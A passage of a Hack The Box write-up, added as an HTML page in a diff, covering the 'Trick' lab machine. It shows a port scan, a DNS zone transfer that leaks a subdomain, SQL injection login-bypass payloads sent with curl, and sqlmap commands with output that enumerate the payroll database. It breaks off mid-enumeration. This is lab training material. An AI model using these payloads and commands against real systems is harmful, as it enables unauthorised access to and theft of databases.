@@ -1,0 +1,525 @@
+<!doctype html><html lang="es"><head><title>Trick | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files"><meta itemprop="description" content="Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files"><meta name="twitter:card" content="Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files"><meta name="twitter:description" content="Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files"><meta property="og:description" content="Hack The Box. Linux. Easy machine. This machine has a DNS service that is vulnerable to a Domain Zone Transfer attack and leaks a subdomain. Here we can bypass authentication with SQLi and exploit an LFI. Both vulnerabilities can be chained to get access to the machine. Then, we find another subdomain that is again vulnerable to LFI, and we can leak a user&rsquo;s SSH private key. This user is able to restart fail2ban with sudo and modify configuration files"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Trick/Trick.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Trick/Trick.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Trick/Trick.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Trick"><meta property="twitter:title" content="Trick"><meta property="og:title" content="Trick"><meta property="og:url" content="https://7rocky.github.io/en/htb/trick/"><meta itemprop="keywords" content="php,dns,sudo,sqli,file-permissions,lfi,domain-zone-transfer,rce,directory-path-traversal,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
+<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/trick/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
+<a class="link-transition lang link dib z-999 pt3 pt0-l" href title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/trick/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/trick/&text=Trick" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/trick/&title=Trick" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Trick</h1><time class="mt4 f6 dib tracked" datetime="2022-10-29T00:00:00+01:00">29 / 10 / 2022</time><br><p class="mb4 f6 dib tracked">17 minutes to read</p></header><div class="htb-image"><img alt="Trick" src="/images/HTB/Trick/Trick.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/php" title="PHP">PHP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/dns" title="DNS">DNS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sqli" title="SQL Injection">SQL Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/lfi" title="Local File Inclusion">Local File Inclusion</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/domain-zone-transfer" title="Domain Zone Transfer">Domain Zone Transfer</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#dns-enumeration">DNS enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#exploiting-sqli">Exploiting SQLi</a></li><li><a href="#finding-an-lfi">Finding an LFI</a></li><li><a href="#obtaining-rce">Obtaining RCE</a></li></ul></li><li><a href="#lateral-movement-to-user-michael">Lateral movement to user <code>michael</code></a><ul><li><a href="#finding-another-lfi">Finding another LFI</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Easy</li><li><strong>IP Address</strong>: 10.10.11.166</li><li><strong>Release</strong>: 18 / 06 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.166 -p 22,25,53,80
+Nmap scan report for 10.10.11.166
+Host is up (0.23s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
+|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
+|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING  
+53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
+| dns-nsid:
+|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
+80/tcp open  http    nginx 1.14.2
+|_http-title: Coming Soon - Start Bootstrap Theme
+|_http-server-header: nginx/1.14.2
+Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 48.81 seconds
+</code></pre></div><p>This machine has ports 22 (SSH), 25 (SMTP), 53 (DNS) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.166</code>, we will see a page like this:</p><p><img src="/images/HTB/Trick/Trick-index.png" alt="Trick index"></p><p>There is nothing useful on this site, the form does not work.</p><h3 id="dns-enumeration">DNS enumeration</h3><p>Since the machine has a DNS server exposed, we can ask the server to show domains and subdomains using reverse DNS queries. For example:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">dig</span> -x 10.10.11.166 @10.10.11.166
+
+; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; -x 10.10.11.166 @10.10.11.166  
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 26900
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;166.11.10.10.in-addr.arpa.     IN      PTR
+
+;; ANSWER SECTION:
+166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.
+
+;; AUTHORITY SECTION:
+11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.
+
+;; ADDITIONAL SECTION:
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+
+;; Query time: 38 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166)
+;; WHEN: Tue Jul 05 11:52:00 CEST 2022
+;; MSG SIZE  rcvd: 135
+</code></pre></div><p>So we can add <code>trick.htb</code> to <code>/etc/hosts</code>. Unfortunately, the above website is the same as <code>http://trick.htb</code>. Moreover, <code>ffuf</code> does not find any subdomain using common wordlists.</p><p>Hence, we can try querying the DNS a bit more. For instance, we can perform a Domain Zone Transfer attack:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">dig</span> trick.htb @10.10.11.166 axfr
+
+; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; trick.htb @10.10.11.166 axfr
+;; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800  
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 50 msec
+;; SERVER: 10.10.11.166#53(10.10.11.166)
+;; WHEN: Tue Jul 05 12:01:33 CEST 2022
+;; XFR size: 6 records (messages 1, bytes 203)
+</code></pre></div><h2 id="foothold">Foothold</h2><p>So we have <code>preprod-payroll.trick.htb</code>. Now we can see another website at <code>http://preprod-payroll.trick.htb</code>:</p><p><img src="/images/HTB/Trick/Trick-preprod.png" alt="Trick preprod-payroll"></p><h3 id="exploiting-sqli">Exploiting SQLi</h3><p>At this point, we can try a SQL injection attack, with a common payload:</p><p><img src="/images/HTB/Trick/Trick-preprod-sqli.png" alt="Trick preprod-payroll SQLi"></p><p>And we are in as the administrator:</p><p><img src="/images/HTB/Trick/Trick-preprod-administrator.png" alt="Trick preprod-payroll administrator"></p><p>Let&rsquo;s check the type of SQLi we are exploiting:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-payroll.trick.htb/ajax.php?action=login'</span> -d <span class="code-dark-yellow">"username='&password=asdf"</span>
+&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property 'num_rows' of non-object in &lt;b&gt;/var/www/payroll/admin_class.php&lt;/b&gt; on line &lt;b&gt;21&lt;/b&gt;&lt;br /&gt;  
+3
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-payroll.trick.htb/ajax.php?action=login'</span> -d <span class="code-dark-yellow">"username='+or+1=1--+-&password=asdf"</span>
+1
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'preprod-payroll.trick.htb/ajax.php?action=login'</span> -d <span class="code-dark-yellow">"username='+or+2=1--+-&password=asdf"</span>
+3
+</code></pre></div><p>We are in front of a Boolean-based blind SQLi, because the only information we get is <code>1</code> (true) or <code>3</code> (false). And if the SQL query is incorrect, we see an error that leaks out a path: <code>/var/www/payroll/admin_class.php</code>.</p><p>Now, we can use <code>sqlmap</code> with specific parameters to go straight to the point. First of all, let&rsquo;s enumerate databases:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url <span class="code-dark-yellow">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --dbs
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">'</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.6.6#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">,</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">'</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-green">INFO</span>]<span class="code-white"> testing connection to the target URL</span>
+<span class="code-white">you have not declared cookie(s), while server wants to set its own ('PHPSESSID=i0erqses93k...46t092dbr9'). Do you want to use those [Y/n] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] checking if the target is protected by some kind of WAF/IPS
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing if the target URL content is stable
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] target URL content is stable
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing if POST parameter '<span class="code-white">username</span>' is dynamic
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-yellow">WARNING</span>]<span class="code-white"> heuristic (basic) test shows that POST parameter '<span class="code-white">username</span>' might not be injectable</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing for SQL injection on POST parameter '<span class="code-white">username</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">AND boolean-based blind - WHERE or HAVING clause</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing '<span class="code-white">AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span>'
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-green">INFO</span>]<span class="code-white"> POST parameter '<span class="code-white">username</span>' appears to be '<span class="code-white">AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span>' injectable (with --not-string="21")</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-green">INFO</span>]<span class="code-white"> heuristic (extended) test shows that the back-end DBMS could be '<span class="code-white">MySQL</span>'</span>
+<span class="code-white">it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span>
+<span class="code-white">for the remaining tests, do you want to include all tests for 'MySQL' extending provided risk (1) value? [Y/n] Y</span>
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] checking if the injection point on POST parameter '<span class="code-white">username</span>' is a false positive
+<span class="code-white">POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span>
+sqlmap identified the following injection point(s) with a total of 182 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: username=1' AND 3839=(SELECT (CASE WHEN (3839=3839) THEN 3839 ELSE (SELECT 2922 UNION SELECT 7749) END))-- tjdZ
+---
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] testing MySQL
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] confirming MySQL
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-green">INFO</span>]<span class="code-white"> the back-end DBMS is MySQL</span>
+web application technology: PHP, Nginx 1.14.2
+back-end DBMS: MySQL &gt;= 5.0.0 (<span class="code-white">MariaDB </span>fork)
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching database names
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching number of databases
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-yellow">WARNING</span>] running in a single-thread mode. Please consider usage of option '<span class="code-white">--threads</span>' for faster data retrieval
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: 2
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: information_schema
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] retrieved: payroll_db
+available databases [2]:
+[*] information_schema
+[*] payroll_db
+
+...
+</code></pre></div><p>Alright: <code>information_schema</code> and <code>payroll_db</code>. Now we can add the DBMS (MySQL) and the database (<code>payroll_db</code>). What tables are in this database?</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url <span class="code-dark-yellow">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db --tables
+<span class="code-yellow">        ___</span>
+<span class="code-yellow">       __H__</span>
+<span class="code-yellow"> ___ ___[<span class="code-bg-red">)</span>]_____ ___ ___  </span><span class="code-white">{<span class="code-grey">1.6.6#stable</span>}</span>
+<span class="code-yellow">|_ -| . [<span class="code-bg-red">'</span>]     | .'| . |</span>
+<span class="code-yellow">|___|_  [<span class="code-bg-red">(</span>]_|_|_|__,|  _|</span>
+<span class="code-yellow">      |_|V...       |_|   </span><span class="mtku code-white">https://sqlmap.org</span>
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program  
+
+[*] starting
+
+...
+
+[<span class="code-dark-cyan">hh:mm:ss</span>] [<span class="code-dark-green">INFO</span>] fetching tables for database: '<span class="code-white">payroll_db</span>'
+...
+
+Database: payroll_db
+[10 tables]
++---------------------+
+| position            |
+| attendance          |
+| deductions          |
+| department          |
+| employee            |
+| employee_allowances |
+| employee_deductions |
+| payroll             |
+| payroll_items       |
+| users               |
++---------------------+
+
+...
+</code></pre></div><p>Great, we are interested in the table named <code>users</code>. Let&rsquo;s enumerate columns:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sqlmap</span> --url <span class="code-dark-yellow">'http://preprod-payroll.trick.htb/ajax.php?action=login'</span> --data username=1 -p username --method POST --technique B --skip-waf --batch --level 5 --threads 5 --dbms mysql -D payroll_db -T users --columns
+<span class="code-yellow">        ___</span>
